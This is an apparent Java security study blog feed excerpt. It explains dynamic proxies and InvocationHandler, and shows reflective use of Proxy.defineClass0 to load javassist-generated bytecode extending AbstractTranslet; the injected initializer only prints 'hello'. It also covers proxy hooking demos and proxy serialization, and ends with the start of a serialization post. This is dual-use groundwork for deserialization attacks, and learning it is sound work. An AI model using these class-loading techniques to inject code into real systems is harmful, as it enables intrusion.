class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2020/1/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><br>  <span class="hljs-comment">// 省去成员变量和部分类方法...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 获取动态代理处理类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy 返回调用处理程序的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 代理实例的调用处理程序</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 如果参数不是一个代理实例</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类实例</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     指定动态代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 指定动态代理类的类需要实现的接口数组</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          动态代理处理类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 返回动态代理生成的代理类实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException 不正确的参数异常</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     定义代理类的类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces 代理类要实现的接口列表</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 用指定的类加载器定义的代理类，它可以实现指定的接口</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 检测某个类是否是动态代理类</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl 要测试的类</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 如该类为代理类，则为 true，否则为 false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 向指定的类加载器中定义一个类对象</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader 类加载器</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   类名</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      类字节码</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    截取开始位置</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    截取长度</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVM创建的类Class对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="java-lang-reflect-InvocationHandler"><a href="#java-lang-reflect-InvocationHandler" class="headerlink" title="java.lang.reflect.InvocationHandler"></a>java.lang.reflect.InvocationHandler</h3><p>用于调用<code>java.lang.reflect.Proxy</code>生成的代理类方法，接口中只定义了一个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并</span><br><span class="hljs-comment"> * 将其指派到它的调用处理程序的 invoke 方法。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 在代理实例上处理方法调用并返回结果。在与方法关联的代理实例上调用方法时，将在调用处理程序上调用此方法。</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy  在其上调用方法的代理实例</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> method 对应于在代理实例上调用的接口方法的 Method 实例。Method 对象的声明类将是在其中声明</span><br><span class="hljs-comment">     *               方法的接口，该接口可以是代理类赖以继承方法的代理接口的超接口。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> args   包含传入代理实例上方法调用的参数值的对象数组，如果接口方法不使用参数，</span><br><span class="hljs-comment">     *               则为 null。基本类型的参数被包装在适当基本包装器类（如 java.lang.Integer</span><br><span class="hljs-comment">     *               或 java.lang.Boolean）的实例中。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 从代理实例的方法调用返回的值。如果接口方法的声明返回类型是基本类型，</span><br><span class="hljs-comment">     * 则此方法返回的值一定是相应基本包装对象类的实例；否则，它一定是可分配到声明返回类型的类型。</span><br><span class="hljs-comment">     * 如果此方法返回的值为 null 并且接口方法的返回类型是基本类型，则代理实例上的方法调用将抛出</span><br><span class="hljs-comment">     * NullPointerException。否则，如果此方法返回的值与上述接口方法的声明返回类型不兼容，</span><br><span class="hljs-comment">     * 则代理实例上的方法调用将抛出 ClassCastException。</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> Throwable 从代理实例上的方法调用抛出的异常。该异常的类型必须可以分配到在接口方法的</span><br><span class="hljs-comment">     *                   throws 子句中声明的任一异常类型或未经检查的异常类型 java.lang.RuntimeException 或</span><br><span class="hljs-comment">     *                   java.lang.Error。如果此方法抛出经过检查的异常，该异常不可分配到在接口方法的 throws 子句中</span><br><span class="hljs-comment">     *                   声明的任一异常类型，代理实例的方法调用将抛出包含此方法曾抛出的异常的</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用java-lang-reflect-Proxy动态创建类对象"><a href="#使用java-lang-reflect-Proxy动态创建类对象" class="headerlink" title="使用java.lang.reflect.Proxy动态创建类对象"></a>使用java.lang.reflect.Proxy动态创建类对象</h2><p><code>ClassLoader</code>和<code>Unsafe</code>都有一个叫做<code>defineClassXXX</code>的<code>native</code>方法，我们可以通过调用这个<code>native</code>方法动态的向<code>JVM</code>创建一个类对象，而<code>java.lang.reflect.Proxy</code>类恰好也有这么一个<code>native</code>方法，所以我们也将可以通过调用<code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法实现动态创建类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProxyDefineclass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            ClassPool cp = ClassPool.getDefault();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>            CtClass ctClass = cp.makeClass(<span class="hljs-string">&quot;Cat&quot;</span>);<br>            String cmd = <span class="hljs-string">&quot;java.lang.System.out.println(\&quot;hello\&quot;);&quot;</span>;<br>            ctClass.makeClassInitializer().insertBefore(cmd);<br>            ctClass.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br>            <span class="hljs-keyword">byte</span>[] classbyte = ctClass.toBytecode();<br>            System.out.println();<br>            ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();<br>            Method defineClass0 = Proxy.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass0&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;ClassLoader.class, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class&#125;);<br>            defineClass0.setAccessible(<span class="hljs-keyword">true</span>);<br>            Class invokedefineclass0 = (Class) defineClass0.invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[]&#123;systemClassLoader, <span class="hljs-string">&quot;Cat&quot;</span>, classbyte, <span class="hljs-number">0</span>, classbyte.length&#125;);<br>            System.out.println(invokedefineclass0);<br>        &#125; <span class="hljs-keyword">catch</span> (CannotCompileException | NoSuchMethodException | IllegalAccessException | InvocationTargetException |<br>                 NotFoundException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>动态代理生成出来的类有如下技术细节和特性：</strong></p><ol><li>动态代理的必须是接口类，通过<code>动态生成一个接口实现类</code>来代理接口的方法调用(<code>反射机制</code>)。</li><li>动态代理类会由<code>java.lang.reflect.Proxy.ProxyClassFactory</code>创建。</li><li><code>ProxyClassFactory</code>会调用<code>sun.misc.ProxyGenerator</code>类生成该类的字节码，并调用<code>java.lang.reflect.Proxy.defineClass0()</code>方法将该类注册到<code>JVM</code>。</li><li>该类继承于<code>java.lang.reflect.Proxy</code>并实现了需要被代理的接口类，因为<code>java.lang.reflect.Proxy</code>类实现了<code>java.io.Serializable</code>接口，所以被代理的类支持<code>序列化/反序列化</code>。</li><li>该类实现了代理接口类(示例中的接口类是<code>com.anbai.sec.proxy.FileSystem</code>)，会通过<code>ProxyGenerator</code>动态生成接口类(<code>FileSystem</code>)的所有方法，</li><li>该类因为实现了代理的接口类，所以当前类是代理的接口类的实例(<code>proxyInstance instanceof FileSystem</code>为<code>true</code>)，但不是代理接口类的实现类的实例(<code>proxyInstance instanceof UnixFileSystem</code>为<code>false</code>)。</li><li>该类方法中包含了被代理的接口类的所有方法，通过调用动态代理处理类(<code>InvocationHandler</code>)的<code>invoke</code>方法获取方法执行结果。</li><li>该类代理的方式重写了<code>java.lang.Object</code>类的<code>toString</code>、<code>hashCode</code>、<code>equals</code>方法。</li><li>如果动过动态代理生成了多个动态代理类，新生成的类名中的<code>0</code>会自增，如<code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</li></ol><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ClassMapDemo</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        InvocationHandlerDemo invocationHandlerDemo = <span class="hljs-keyword">new</span> InvocationHandlerDemo(<span class="hljs-keyword">new</span> HashMap());<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;, invocationHandlerDemo);<br>        System.out.println(proxyMap.put(<span class="hljs-string">&quot;proxy&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>));<br>        proxyMap.get(<span class="hljs-string">&quot;proxy&quot;</span>);<br>        proxyMap.entrySet();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvocationHandlerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> Object map;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvocationHandlerDemo</span><span class="hljs-params">(Map map)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (method.getName().contains(<span class="hljs-string">&quot;put&quot;</span>)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Hook Map.put Method: &quot;</span> + method.getName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;not allowed&quot;</span>;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;detect the method: &quot;</span> + method.getName() + <span class="hljs-string">&quot;, and exec without being hooked&quot;</span>);<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.map, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ORIObjectfindName</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectInterface</span></span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getClassName</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;white class: &quot;</span>+ object.hashCode() +<span class="hljs-string">&quot;, pass!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ObjectfindName</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object object;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object object)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.object=object;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-keyword">this</span>.getClass().getClassLoader(), <span class="hljs-keyword">this</span>.object.getClass().getInterfaces(),<span class="hljs-keyword">this</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">for</span>(Object o:args)&#123;<br>            System.out.println(<span class="hljs-string">&quot;black class proxy: &quot;</span>+ o.hashCode() +<span class="hljs-string">&quot;, block!&quot;</span>);<br>            <span class="hljs-keyword">if</span> (o.toString().contains(<span class="hljs-string">&quot;System&quot;</span>))&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> method.invoke(<span class="hljs-keyword">this</span>.object,args);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DynamicProxy</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ORIObjectfindName oriObjectfindName = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        oriObjectfindName.getClassName(String.class);<br><br>        ObjectInterface oriObjectfindName1 = <span class="hljs-keyword">new</span> ORIObjectfindName();<br>        ObjectfindName objectfindNameproxy = <span class="hljs-keyword">new</span> ObjectfindName();<br>        ObjectInterface objectInterface =(ObjectInterface) objectfindNameproxy.get(oriObjectfindName1);<br>        objectInterface.getClassName(System.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="动态代理类实例序列化问题"><a href="#动态代理类实例序列化问题" class="headerlink" title="动态代理类实例序列化问题"></a>动态代理类实例序列化问题</h2><p>动态代理类符合<code>Java</code>对象序列化条件，并且在<code>序列化/反序列化</code>时会被<code>ObjectInputStream/ObjectOutputStream</code>特殊处理</p><p>动态代理生成的类在<code>反序列化/反序列化</code>时不会序列化该类的成员变量，并且<code>serialVersionUID</code>为<code>0L</code> ，也将是说将该类的<code>Class</code>对象传递给<code>java.io.ObjectStreamClass</code>的静态<code>lookup</code>方法时，返回的<code>ObjectStreamClass</code>实例将具有以下特性：</p><ol><li>调用其<code>getSerialVersionUID</code>方法将返回<code>0L</code> </li><li>调用其<code>getFields</code>方法将返回长度为零的数组</li><li>调用其<code>getField</code>方法将返回<code>null</code> </li></ol><p>但其父类(<code>java.lang.reflect.Proxy</code>)在序列化时不受影响，父类中的<code>h</code>变量(<code>InvocationHandler</code>)将会被序列化，这个<code>h</code>存储了动态代理类的处理类实例以及动态代理的接口类的实现类的实例</p><p>动态代理生成的对象(<code>com.sun.proxy.$ProxyXXX</code>)序列化的时候会使用一个特殊的协议：<code>TC_PROXYCLASSDESC(0x7D)</code>，这个常量在<code>java.io.ObjectStreamConstants</code>中定义的。在反序列化时也不会调用<code>java.io.ObjectInputStream</code>类的<code>resolveClass</code>方法而是调用<code>resolveProxyClass</code>方法来转换成类对象的</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java序列化反序列化</title>
    <link href="/2023/03/15/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/03/15/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java序列化-反序列化"><a href="#Java序列化-反序列化" class="headerlink" title="Java序列化/反序列化"></a>Java序列化/反序列化</h1><p>序列化需要实现接口<code>java.io.Serializable</code>(内部序列化)或<code>java.io.Externalizaable</code>(外部序列化)，其中后者实现了前者的接口</p><p>一个类中，某些属性是不可序列化的，则必须冠以<code>static transient</code>等修饰</p><p>反序列化的条件：</p><ol><li>被反序列化的类必须存在</li><li><code>serialVersionUID</code>值必须存在</li></ol><blockquote><p><code>serialVersionUID</code>这个值是序列化时产生的，可以由我们指定(显式声明)，也可以由编译器生成，反序列化时会比对UID，匹配才能反序列化成功；<strong>这个UID必须以static final long修饰</strong>，权限建议以<code>private</code>修饰，因为它往往不需要继承</p></blockquote><p><strong>借助ObjectOutputStream.writeObject、ObjectInputStream.readObject就可以实现序列化以及反序列化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *ClassName: DeserializeTest</span><br><span class="hljs-comment"> *Description: A Class for learning Serialize and Deserialize</span><br><span class="hljs-comment"> *Author: zZ</span><br><span class="hljs-comment"> *Time: 2022/7/27</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String username;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(String email)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span 